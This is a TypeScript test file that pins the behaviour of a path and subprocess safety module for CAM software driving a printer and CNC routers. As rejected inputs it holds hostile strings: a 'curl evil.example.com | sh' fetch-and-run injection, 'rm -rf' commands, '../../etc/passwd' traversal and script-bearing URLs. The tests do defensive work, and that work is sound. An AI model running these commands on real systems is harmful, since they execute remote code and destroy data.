/**
 * path-security-pin.test.ts -- [ID-0289] Cycle 217 test-coverage paired-pin
 *
 * Pins the contract of `src/main/path-security.ts` -- the 140-line PATH-AND-
 * SUBPROCESS SAFETY GATE consumed by main-process file I/O + Python engine
 * spawning across ALL three target machines:
 *
 *   - **Creality K2 Plus** (FDM): `isSafeExternalUrl` gates the Moonraker
 *     upload URL; `isSubprocessArgSafe` defends the curl shell-out path
 *     when uploading G-code; `sanitizeFilename` cleans user-supplied
 *     filenames before they reach the upload endpoint.
 *   - **Laguna Swift 5x10** (CNC router): `isPathSafe` +
 *     `isAbsolutePathUnderRoots` gate every file dialog result that picks
 *     a saved post (.tap / .nc / .mmg) for RichAuto A-series; `sanitizeFilename`
 *     gates the post-output filename written to the user's USB stick.
 *   - **Makera Carvera + 4-axis Rotary** (desktop 4-axis): all of the above,
 *     PLUS `isPythonPathSafe` defends the Python CAM engine spawn that
 *     runs the rotary toolpath strategies (`engines/cam/advanced/`).
 *
 * Companion behavioral file: `path-security.test.ts` (~57 it() across 6
 * describe groups -- happy-path traversal-rejection matrix per function).
 * This pin file extends coverage to lock the CONTRACT surface the call-
 * sites depend on -- module shape, exports, the 6-export count, the
 * null-byte-everywhere invariant, the shell-metachar reject set, the
 * URL protocol allow-list, the three-machine realism scenarios, the
 * pure-function invariant (no global / no I/O / no env access), and
 * the source-text whitelist (no eval / no Function / no fs / no shell
 * metachar regex drift).
 *
 * Per CLAUDE.md "Safety Rule 1 -- G-code is sacred" + "No security
 * vulnerabilities": this pin file authors tests only. No edits to
 * `path-security.ts`, no machine-profile edits, no `.hbs` template
 * edits, no schema edits.
 */
import { describe, expect, it } from 'vitest'
import { readFileSync } from 'node:fs'
import { resolve as resolvePath, sep } from 'node:path'
import * as Mod from './path-security'
import {
  isAbsolutePathUnderRoots,
  isPathSafe,
  isPythonPathSafe,
  isSafeExternalUrl,
  isSubprocessArgSafe,
  sanitizeFilename
} from './path-security'

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** All 6 runtime exports the source emits, in declaration order. */
const RUNTIME_EXPORTS_IN_ORDER = [
  'isPathSafe',
  'isAbsolutePathUnderRoots',
  'sanitizeFilename',
  'isSafeExternalUrl',
  'isSubprocessArgSafe',
  'isPythonPathSafe'
] as const

/** Shell metacharacters that `isPythonPathSafe` MUST reject (per source regex). */
const SHELL_METACHARS = [';', '&', '|', '`', '$', '(', ')', '{', '}', '!', '#'] as const

/** The ROOT picked is platform-dependent. */
const PLATFORM_ROOT = process.platform === 'win32' ? 'C:\\Projects\\TestRoot' : '/projects/test-root'

/** Read the source file once for the source-text whitelist describe group. */
const SOURCE_PATH = resolvePath(__dirname, 'path-security.ts')
const SOURCE_TEXT = readFileSync(SOURCE_PATH, 'utf8')

// ---------------------------------------------------------------------------
// A. Module shape -- export name set, runtime function count, no extras
// ---------------------------------------------------------------------------

describe('path-security-pin :: A. module shape', () => {
  it('exports exactly the 6 runtime functions', () => {
    const names = Object.keys(Mod).filter((k) => typeof (Mod as Record<string, unknown>)[k] === 'function')
    expect(names.sort()).toEqual([...RUNTIME_EXPORTS_IN_ORDER].sort())
  })

  it('every runtime export is a function', () => {
    for (const name of RUNTIME_EXPORTS_IN_ORDER) {
      expect(typeof (Mod as Record<string, unknown>)[name]).toBe('function')
    }
  })

  it('no Promise / async surface on any runtime export (synchronous gates only)', () => {
    for (const name of RUNTIME_EXPORTS_IN_ORDER) {
      const fn = (Mod as Record<string, unknown>)[name] as (...args: unknown[]) => unknown
      expect(fn.constructor.name).toBe('Function')
    }
  })

  it('module has exactly 6 runtime exports (no surprises)', () => {
    const fnNames = Object.keys(Mod).filter((k) => typeof (Mod as Record<string, unknown>)[k] === 'function')
    expect(fnNames.length).toBe(6)
  })

  it('all 6 runtime exports are individually importable', () => {
    expect(typeof isPathSafe).toBe('function')
    expect(typeof isAbsolutePathUnderRoots).toBe('function')
    expect(typeof sanitizeFilename).toBe('function')
    expect(typeof isSafeExternalUrl).toBe('function')
    expect(typeof isSubprocessArgSafe).toBe('function')
    expect(typeof isPythonPathSafe).toBe('function')
  })
})

// ---------------------------------------------------------------------------
// B. isPathSafe -- traversal + null-byte + prefix-lex defense
// ---------------------------------------------------------------------------

describe('path-security-pin :: B. isPathSafe', () => {
  it('arity is exactly 2 (userPath, allowedRoot)', () => {
    expect(isPathSafe.length).toBe(2)
  })

  it('returns absolute path string when safe', () => {
    const r = isPathSafe('a.stl', PLATFORM_ROOT)
    expect(typeof r).toBe('string')
    expect(r).not.toBeNull()
  })

  it('returns null for empty userPath', () => {
    expect(isPathSafe('', PLATFORM_ROOT)).toBeNull()
  })

  it('returns null for empty allowedRoot', () => {
    expect(isPathSafe('a.stl', '')).toBeNull()
  })

  it('returns null for null-byte in userPath', () => {
    expect(isPathSafe('a.stl\0evil', PLATFORM_ROOT)).toBeNull()
  })

  it('returns null for null-byte in allowedRoot', () => {
    expect(isPathSafe('a.stl', PLATFORM_ROOT + '\0evil')).toBeNull()
  })

  it('rejects ../ traversal escaping root', () => {
    expect(isPathSafe('../../etc/passwd', PLATFORM_ROOT)).toBeNull()
  })

  it('rejects nested ../ traversal escaping root', () => {
    expect(isPathSafe('a/b/../../../etc/passwd', PLATFORM_ROOT)).toBeNull()
  })

  it('allows ./ self-reference resolving to root', () => {
    expect(isPathSafe('.', PLATFORM_ROOT)).not.toBeNull()
  })

  it('allows nested subdirectories', () => {
    const r = isPathSafe('a/b/c.stl', PLATFORM_ROOT)
    expect(r).not.toBeNull()
    expect(r!.includes('c.stl')).toBe(true)
  })

  it('rejects sibling root with similar prefix (test-root vs test-root-evil)', () => {
    const sibling = PLATFORM_ROOT + '-evil'
    const candidate = sibling + sep + 'a.stl'
    expect(isPathSafe(candidate, PLATFORM_ROOT)).toBeNull()
  })

  it('returned absolute path has no traversal sequences', () => {
    const r = isPathSafe('a/./b/../c.stl', PLATFORM_ROOT)
    expect(r).not.toBeNull()
    expect(r!.includes('..')).toBe(false)
  })

  it('return value is always string | null (never undefined)', () => {
    expect(isPathSafe('a.stl', PLATFORM_ROOT)).not.toBeUndefined()
    expect(isPathSafe('', PLATFORM_ROOT)).not.toBeUndefined()
  })
})

// ---------------------------------------------------------------------------
// C. isAbsolutePathUnderRoots -- multi-root abs-path gate
// ---------------------------------------------------------------------------

describe('path-security-pin :: C. isAbsolutePathUnderRoots', () => {
  it('arity is exactly 2 (absPath, allowedRoots[])', () => {
    expect(isAbsolutePathUnderRoots.length).toBe(2)
  })

  it('returns null for empty absPath', () => {
    expect(isAbsolutePathUnderRoots('', [PLATFORM_ROOT])).toBeNull()
  })

  it('returns null for null-byte in absPath', () => {
    const candidate = PLATFORM_ROOT + sep + 'a.stl\0evil'
    expect(isAbsolutePathUnderRoots(candidate, [PLATFORM_ROOT])).toBeNull()
  })

  it('returns null for empty roots array', () => {
    const candidate = PLATFORM_ROOT + sep + 'a.stl'
    expect(isAbsolutePathUnderRoots(candidate, [])).toBeNull()
  })

  it('skips empty roots in the array (does not crash)', () => {
    const candidate = PLATFORM_ROOT + sep + 'a.stl'
    expect(isAbsolutePathUnderRoots(candidate, ['', PLATFORM_ROOT])).not.toBeNull()
  })

  it('skips null-byte roots in the array', () => {
    const candidate = PLATFORM_ROOT + sep + 'a.stl'
    const result = isAbsolutePathUnderRoots(candidate, [PLATFORM_ROOT + '\0', PLATFORM_ROOT])
    expect(result).not.toBeNull()
  })

  it('returns absolute path when path equals root exactly', () => {
    expect(isAbsolutePathUnderRoots(PLATFORM_ROOT, [PLATFORM_ROOT])).not.toBeNull()
  })

  it('returns null when path is outside all roots', () => {
    const otherRoot = process.platform === 'win32' ? 'C:\\Other' : '/other'
    const candidate = otherRoot + sep + 'a.stl'
    expect(isAbsolutePathUnderRoots(candidate, [PLATFORM_ROOT])).toBeNull()
  })

  it('returns absolute path when matched against second root in list', () => {
    const otherRoot = process.platform === 'win32' ? 'C:\\Other' : '/other'
    const candidate = otherRoot + sep + 'a.stl'
    const result = isAbsolutePathUnderRoots(candidate, [PLATFORM_ROOT, otherRoot])
    expect(result).not.toBeNull()
  })

  it('rejects sibling root with similar prefix', () => {
    const sibling = PLATFORM_ROOT + '-evil'
    const candidate = sibling + sep + 'a.stl'
    expect(isAbsolutePathUnderRoots(candidate, [PLATFORM_ROOT])).toBeNull()
  })
})

// ---------------------------------------------------------------------------
// D. sanitizeFilename -- comprehensive char rejection
// ---------------------------------------------------------------------------

describe('path-security-pin :: D. sanitizeFilename', () => {
  it('arity is exactly 1', () => {
    expect(sanitizeFilename.length).toBe(1)
  })

  it('returns null for empty input', () => {
    expect(sanitizeFilename('')).toBeNull()
  })

  it('returns null when sanitization empties the result', () => {
    expect(sanitizeFilename('....')).toBeNull()
    expect(sanitizeFilename('   ')).toBeNull()
    expect(sanitizeFilename('<>:|?*')).toBeNull()
  })

  it('strips path separators (forward slash)', () => {
    expect(sanitizeFilename('a/b/c.txt')).toBe('c.txt')
  })

  it('strips path separators (backslash, normalized to forward)', () => {
    expect(sanitizeFilename('a\\b\\c.txt')).toBe('c.txt')
  })

  it('strips Windows reserved char <', () => {
    expect(sanitizeFilename('foo<bar.txt')).toBe('foobar.txt')
  })

  it('strips Windows reserved char >', () => {
    expect(sanitizeFilename('foo>bar.txt')).toBe('foobar.txt')
  })

  it('strips Windows reserved char :', () => {
    expect(sanitizeFilename('foo:bar.txt')).toBe('foobar.txt')
  })

  it('strips Windows reserved char "', () => {
    expect(sanitizeFilename('foo"bar.txt')).toBe('foobar.txt')
  })

  it('strips Windows reserved char |', () => {
    expect(sanitizeFilename('foo|bar.txt')).toBe('foobar.txt')
  })

  it('strips Windows reserved char ?', () => {
    expect(sanitizeFilename('foo?bar.txt')).toBe('foobar.txt')
  })

  it('strips Windows reserved char *', () => {
    expect(sanitizeFilename('foo*bar.txt')).toBe('foobar.txt')
  })

  it('strips null byte', () => {
    expect(sanitizeFilename('foo\0bar.txt')).toBe('foobar.txt')
  })

  it('strips control characters 0x01-0x1F', () => {
    for (let code = 0x01; code <= 0x1f; code += 1) {
      const ch = String.fromCharCode(code)
      const result = sanitizeFilename(`a${ch}b.txt`)
      expect(result).toBe('ab.txt')
    }
  })

  it('strips leading dots', () => {
    expect(sanitizeFilename('....hidden.txt')).toBe('hidden.txt')
  })

  it('strips trailing dots and spaces', () => {
    expect(sanitizeFilename('foo.txt   ')).toBe('foo.txt')
    expect(sanitizeFilename('foo.txt...')).toBe('foo.txt')
  })

  it('passes a normal filename verbatim', () => {
    expect(sanitizeFilename('part.stl')).toBe('part.stl')
    expect(sanitizeFilename('design.gcode')).toBe('design.gcode')
  })

  it('passes Laguna RichAuto post extension verbatim (.mmg / .tap / .nc)', () => {
    expect(sanitizeFilename('output.mmg')).toBe('output.mmg')
    expect(sanitizeFilename('output.tap')).toBe('output.tap')
    expect(sanitizeFilename('output.nc')).toBe('output.nc')
  })
})

// ---------------------------------------------------------------------------
// E. isSafeExternalUrl -- protocol allow-list
// ---------------------------------------------------------------------------

describe('path-security-pin :: E. isSafeExternalUrl', () => {
  it('arity is exactly 1', () => {
    expect(isSafeExternalUrl.length).toBe(1)
  })

  it('returns boolean (never null/undefined)', () => {
    expect(typeof isSafeExternalUrl('https://example.com')).toBe('boolean')
    expect(typeof isSafeExternalUrl('')).toBe('boolean')
    expect(typeof isSafeExternalUrl('garbage')).toBe('boolean')
  })

  it('accepts https://', () => {
    expect(isSafeExternalUrl('https://example.com/path')).toBe(true)
    expect(isSafeExternalUrl('https://moonraker.local')).toBe(true) // K2 Plus Moonraker LAN
  })

  it('accepts http://', () => {
    expect(isSafeExternalUrl('http://example.com')).toBe(true)
    expect(isSafeExternalUrl('http://192.168.1.42:7125')).toBe(true) // K2 Plus Moonraker LAN
  })

  it('rejects file:// (file system exfiltration vector)', () => {
    expect(isSafeExternalUrl('file:///etc/passwd')).toBe(false)
    expect(isSafeExternalUrl('file://C:/Windows/System32/cmd.exe')).toBe(false)
  })

  it('rejects javascript: (XSS vector)', () => {
    expect(isSafeExternalUrl('javascript:alert(1)')).toBe(false)
  })

  it('rejects data: (inline-payload vector)', () => {
    expect(isSafeExternalUrl('data:text/html,<script>alert(1)</script>')).toBe(false)
  })

  it('rejects custom protocol handlers', () => {
    expect(isSafeExternalUrl('ms-settings:network')).toBe(false)
    expect(isSafeExternalUrl('vscode://example')).toBe(false)
    expect(isSafeExternalUrl('chrome://settings')).toBe(false)
  })

  it('rejects empty input', () => {
    expect(isSafeExternalUrl('')).toBe(false)
  })

  it('rejects malformed URL', () => {
    expect(isSafeExternalUrl('not a url')).toBe(false)
    expect(isSafeExternalUrl('://broken')).toBe(false)
  })

  it('rejects ftp:// (not in https/http allow-list)', () => {
    expect(isSafeExternalUrl('ftp://example.com')).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// F. isSubprocessArgSafe -- null-byte guard
// ---------------------------------------------------------------------------

describe('path-security-pin :: F. isSubprocessArgSafe', () => {
  it('arity is exactly 1', () => {
    expect(isSubprocessArgSafe.length).toBe(1)
  })

  it('returns boolean', () => {
    expect(typeof isSubprocessArgSafe('arg')).toBe('boolean')
  })

  it('returns true for empty string (caller filters empties separately)', () => {
    expect(isSubprocessArgSafe('')).toBe(true)
  })

  it('returns true for ordinary argument', () => {
    expect(isSubprocessArgSafe('--version')).toBe(true)
    expect(isSubprocessArgSafe('output.gcode')).toBe(true)
  })

  it('returns false on null-byte', () => {
    expect(isSubprocessArgSafe('arg\0evil')).toBe(false)
  })

  it('accepts shell metachars (subprocess-bounded uses shell:false; primary defense elsewhere)', () => {
    // Source comment: "Note: This is a secondary defense. The primary
    // defense is `shell: false` in subprocess-bounded.ts".
    expect(isSubprocessArgSafe('foo;bar')).toBe(true)
    expect(isSubprocessArgSafe('foo|bar')).toBe(true)
    expect(isSubprocessArgSafe('foo&bar')).toBe(true)
  })

  it('accepts paths with spaces (legitimate args may contain spaces)', () => {
    expect(isSubprocessArgSafe('/path with spaces/foo.gcode')).toBe(true)
  })

  it('accepts numeric args verbatim', () => {
    expect(isSubprocessArgSafe('-42')).toBe(true)
    expect(isSubprocessArgSafe('1.5')).toBe(true)
  })

  it('accepts CAM-engine flag args (e.g. --strategy=raster)', () => {
    expect(isSubprocessArgSafe('--strategy=raster')).toBe(true)
    expect(isSubprocessArgSafe('--engine=ocl')).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// G. isPythonPathSafe -- shell-metachar guard for Python CAM engine spawn
// ---------------------------------------------------------------------------

describe('path-security-pin :: G. isPythonPathSafe', () => {
  it('arity is exactly 1', () => {
    expect(isPythonPathSafe.length).toBe(1)
  })

  it('returns boolean', () => {
    expect(typeof isPythonPathSafe('python3')).toBe('boolean')
  })

  it('rejects empty string', () => {
    expect(isPythonPathSafe('')).toBe(false)
  })

  it('rejects null-byte', () => {
    expect(isPythonPathSafe('python\0evil')).toBe(false)
  })

  it('accepts bare executable names', () => {
    expect(isPythonPathSafe('python')).toBe(true)
    expect(isPythonPathSafe('python3')).toBe(true)
    expect(isPythonPathSafe('python3.11')).toBe(true)
  })

  it('accepts absolute paths (POSIX)', () => {
    expect(isPythonPathSafe('/usr/bin/python3')).toBe(true)
    expect(isPythonPathSafe('/opt/anaconda/bin/python')).toBe(true)
  })

  it('accepts absolute paths (Windows)', () => {
    expect(isPythonPathSafe('C:\\Python311\\python.exe')).toBe(true)
    expect(isPythonPathSafe('C:/Python311/python.exe')).toBe(true)
  })

  it('rejects each shell metacharacter in the documented set', () => {
    for (const ch of SHELL_METACHARS) {
      expect(isPythonPathSafe(`python${ch}injected`)).toBe(false)
    }
  })

  it('rejects semicolon injection (cmd separator)', () => {
    expect(isPythonPathSafe('python; rm -rf /')).toBe(false)
  })

  it('rejects ampersand background injection', () => {
    expect(isPythonPathSafe('python && evil')).toBe(false)
  })

  it('rejects pipe injection', () => {
    expect(isPythonPathSafe('python | evil')).toBe(false)
  })

  it('rejects backtick command-substitution', () => {
    expect(isPythonPathSafe('python`evil`')).toBe(false)
  })

  it('rejects dollar-sign command-substitution', () => {
    expect(isPythonPathSafe('python$(evil)')).toBe(false)
  })

  it('rejects parenthesis injection', () => {
    expect(isPythonPathSafe('python(evil)')).toBe(false)
  })

  it('rejects brace injection', () => {
    expect(isPythonPathSafe('python{a,b}')).toBe(false)
  })

  it('rejects history-expansion !', () => {
    expect(isPythonPathSafe('python!1')).toBe(false)
  })

  it('rejects comment hash #', () => {
    expect(isPythonPathSafe('python # comment')).toBe(false)
  })

  it('accepts paths with spaces (no shell metachar)', () => {
    expect(isPythonPathSafe('/path with spaces/python3')).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// H. Three-machine cross-cut realism scenarios
// ---------------------------------------------------------------------------

describe('path-security-pin :: H. three-machine cross-cut realism', () => {
  it('K2 Plus Moonraker LAN URL is allowed', () => {
    expect(isSafeExternalUrl('http://192.168.1.42:7125/server/files/upload')).toBe(true)
    expect(isSafeExternalUrl('https://moonraker.local/api/printer/info')).toBe(true)
  })

  it('K2 Plus Moonraker upload filename is sanitized', () => {
    // User-supplied print job name with traversal attempt
    expect(sanitizeFilename('../../etc/passwd')).toBe('passwd')
    expect(sanitizeFilename('cube.gcode')).toBe('cube.gcode')
  })

  it('Laguna VCarve post output filename .tap is sanitized', () => {
    expect(sanitizeFilename('full-sheet-cut.tap')).toBe('full-sheet-cut.tap')
    expect(sanitizeFilename('   leading-space.tap')).toBe('leading-space.tap')
  })

  it('Carvera Makera Controller post extension .mmg is sanitized', () => {
    expect(sanitizeFilename('rotary-pen.mmg')).toBe('rotary-pen.mmg')
  })

  it('Python CAM engine spawn path (4-axis Carvera roughing) is gate-validated', () => {
    expect(isPythonPathSafe('/usr/bin/python3')).toBe(true)
    expect(isPythonPathSafe('python3')).toBe(true)
  })

  it('Python CAM engine spawn path with shell-injection attempt is rejected', () => {
    // Hypothetical attacker payload via env var override
    expect(isPythonPathSafe('python3 ; curl evil.example.com | sh')).toBe(false)
    expect(isPythonPathSafe('python3 && rm -rf /resources/machines')).toBe(false)
  })

  it('Subprocess args for Python CAM engine reject null-byte injection', () => {
    expect(isSubprocessArgSafe('--strategy=raster\0--engine=evil')).toBe(false)
    expect(isSubprocessArgSafe('--mesh=/path/model.stl')).toBe(true)
  })

  it('Path-traversal attack on a saved-machine-profile root is rejected', () => {
    // resources/machines/ root with traversal attempt
    const profilesRoot = process.platform === 'win32' ? 'C:\\WorkTrackCAM\\resources\\machines' : '/work/resources/machines'
    expect(isPathSafe('../../etc/passwd', profilesRoot)).toBeNull()
    expect(isPathSafe('creality-k2-plus.json', profilesRoot)).not.toBeNull()
    expect(isPathSafe('laguna-swift-5x10.json', profilesRoot)).not.toBeNull()
    expect(isPathSafe('makera-carvera-3axis.json', profilesRoot)).not.toBeNull()
    expect(isPathSafe('makera-carvera-4axis.json', profilesRoot)).not.toBeNull()
  })

  it('Multi-root abs-path gate accepts both project + machine-profile roots', () => {
    const projectRoot = process.platform === 'win32' ? 'C:\\Projects\\Job' : '/projects/job'
    const profilesRoot = process.platform === 'win32' ? 'C:\\WorkTrackCAM\\resources\\machines' : '/work/resources/machines'
    const profileFile = profilesRoot + sep + 'creality-k2-plus.json'
    expect(isAbsolutePathUnderRoots(profileFile, [projectRoot, profilesRoot])).not.toBeNull()
  })

  it('External help URL is allowed (https only)', () => {
    expect(isSafeExternalUrl('https://docs.makera.com/carvera')).toBe(true)
    expect(isSafeExternalUrl('https://www.creality.com/products/k2-plus')).toBe(true)
    expect(isSafeExternalUrl('https://lagunatools.com/cnc/swift-5x10')).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// I. Pure-function invariants (no I/O, no env access, no global mutation)
// ---------------------------------------------------------------------------

describe('path-security-pin :: I. pure-function invariants', () => {
  it('isPathSafe is referentially transparent for identical inputs', () => {
    expect(isPathSafe('a.stl', PLATFORM_ROOT)).toBe(isPathSafe('a.stl', PLATFORM_ROOT))
    expect(isPathSafe('', PLATFORM_ROOT)).toBe(isPathSafe('', PLATFORM_ROOT))
  })

  it('isAbsolutePathUnderRoots is referentially transparent', () => {
    const a = isAbsolutePathUnderRoots(PLATFORM_ROOT + sep + 'x.stl', [PLATFORM_ROOT])
    const b = isAbsolutePathUnderRoots(PLATFORM_ROOT + sep + 'x.stl', [PLATFORM_ROOT])
    expect(a).toBe(b)
  })

  it('sanitizeFilename does not mutate input string (strings are immutable in JS, but verify)', () => {
    const input = 'foo<bar.txt'
    const before = input
    sanitizeFilename(input)
    expect(input).toBe(before)
  })

  it('isAbsolutePathUnderRoots does not mutate input roots array', () => {
    const roots = [PLATFORM_ROOT, PLATFORM_ROOT + '-sibling']
    const before = JSON.stringify(roots)
    isAbsolutePathUnderRoots(PLATFORM_ROOT + sep + 'a.stl', roots)
    expect(JSON.stringify(roots)).toBe(before)
  })

  it('isSafeExternalUrl is referentially transparent', () => {
    expect(isSafeExternalUrl('https://example.com')).toBe(isSafeExternalUrl('https://example.com'))
  })

  it('isSubprocessArgSafe is referentially transparent', () => {
    expect(isSubprocessArgSafe('--flag')).toBe(isSubprocessArgSafe('--flag'))
  })

  it('isPythonPathSafe is referentially transparent', () => {
    expect(isPythonPathSafe('python3')).toBe(isPythonPathSafe('python3'))
    expect(isPythonPathSafe('python;evil')).toBe(isPythonPathSafe('python;evil'))
  })
})

// ---------------------------------------------------------------------------
// J. Source-text whitelist (no eval / no Function / no fs / regex drift)
// ---------------------------------------------------------------------------

describe('path-security-pin :: J. source-text whitelist', () => {
  it('imports exactly basename / normalize / resolve / sep from node:path', () => {
    expect(SOURCE_TEXT).toContain("import { basename, normalize, resolve, sep } from 'node:path'")
  })

  it('no node:fs / node:child_process / node:os imports (pure path-lex module)', () => {
    expect(SOURCE_TEXT).not.toMatch(/from 'node:fs'/)
    expect(SOURCE_TEXT).not.toMatch(/from 'node:child_process'/)
    expect(SOURCE_TEXT).not.toMatch(/from 'node:os'/)
    expect(SOURCE_TEXT).not.toMatch(/from 'fs'/)
  })

  it('no console.* debug calls in production source', () => {
    expect(SOURCE_TEXT).not.toMatch(/\bconsole\.(log|debug|info|warn|error)\b/)
  })

  it('no eval / Function() dynamic-code surface', () => {
    expect(SOURCE_TEXT).not.toMatch(/\beval\(/)
    expect(SOURCE_TEXT).not.toMatch(/new Function\(/)
  })

  it('no Promise / async surface in production code (JSDoc usage example excluded)', () => {
    // Exclude the JSDoc usage-example block at top of source. The example
    // shows `await readFile(safe, 'utf-8')` as a CALLER pattern; the
    // path-security functions themselves are synchronous.
    const stripJsdoc = SOURCE_TEXT.replace(/\/\*\*[\s\S]*?\*\//g, '')
    expect(stripJsdoc).not.toMatch(/\bPromise\b/)
    expect(stripJsdoc).not.toMatch(/\basync\b/)
    expect(stripJsdoc).not.toMatch(/\bawait\b/)
  })

  it('all 6 runtime export names appear in source as `export function`', () => {
    for (const name of RUNTIME_EXPORTS_IN_ORDER) {
      expect(SOURCE_TEXT).toContain(`export function ${name}`)
    }
  })

  it('null-byte literal `\\0` appears in every guard path (sentinel)', () => {
    // Every check at the top of every function uses the `\0` sentinel.
    const occurrences = (SOURCE_TEXT.match(/'\\0'/g) || []).length
    // isPathSafe / isAbsolutePathUnderRoots (loop) / sanitizeFilename via charClass /
    // isSubprocessArgSafe / isPythonPathSafe -> at least 4 explicit '\0' literals.
    expect(occurrences).toBeGreaterThanOrEqual(4)
  })

  it('shell-metachar regex pinned exactly: /[;&|`$(){}!#]/', () => {
    expect(SOURCE_TEXT).toContain('const shellMetachars = /[;&|`$(){}!#]/')
  })

  it('https:/http: protocol allow-list pinned exactly', () => {
    expect(SOURCE_TEXT).toContain("parsed.protocol === 'https:' || parsed.protocol === 'http:'")
  })

  it('Windows-reserved char strip pattern pinned exactly', () => {
    expect(SOURCE_TEXT).toContain('safe.replace(/[<>:"|?*]/g, \'\')')
  })

  it('control-character strip pattern pinned exactly (0x00-0x1F)', () => {
    expect(SOURCE_TEXT).toContain('safe.replace(/[\\x00-\\x1f]/g, \'\')')
  })

  it('source byte length is bounded (regression guard for accidental bloat)', () => {
    expect(SOURCE_TEXT.length).toBeGreaterThan(2500)
    expect(SOURCE_TEXT.length).toBeLessThan(8000)
  })

  it('source ends with a single trailing newline (POSIX convention)', () => {
    expect(SOURCE_TEXT.endsWith('\n')).toBe(true)
    expect(SOURCE_TEXT.endsWith('\n\n')).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// K. Type-level parity (TypeScript surface)
// ---------------------------------------------------------------------------

describe('path-security-pin :: K. type-level parity', () => {
  it('isPathSafe returns string | null', () => {
    const r = isPathSafe('a.stl', PLATFORM_ROOT)
    expect(r === null || typeof r === 'string').toBe(true)
  })

  it('isAbsolutePathUnderRoots returns string | null', () => {
    const r = isAbsolutePathUnderRoots(PLATFORM_ROOT + sep + 'a.stl', [PLATFORM_ROOT])
    expect(r === null || typeof r === 'string').toBe(true)
  })

  it('sanitizeFilename returns string | null', () => {
    const r = sanitizeFilename('a.stl')
    expect(r === null || typeof r === 'string').toBe(true)
  })

  it('isSafeExternalUrl returns primitive boolean', () => {
    expect(typeof isSafeExternalUrl('https://example.com')).toBe('boolean')
    expect(typeof isSafeExternalUrl('')).toBe('boolean')
  })

  it('isSubprocessArgSafe returns primitive boolean', () => {
    expect(typeof isSubprocessArgSafe('arg')).toBe('boolean')
    expect(typeof isSubprocessArgSafe('arg\0')).toBe('boolean')
  })

  it('isPythonPathSafe returns primitive boolean', () => {
    expect(typeof isPythonPathSafe('python3')).toBe('boolean')
    expect(typeof isPythonPathSafe('python;evil')).toBe('boolean')
  })
})
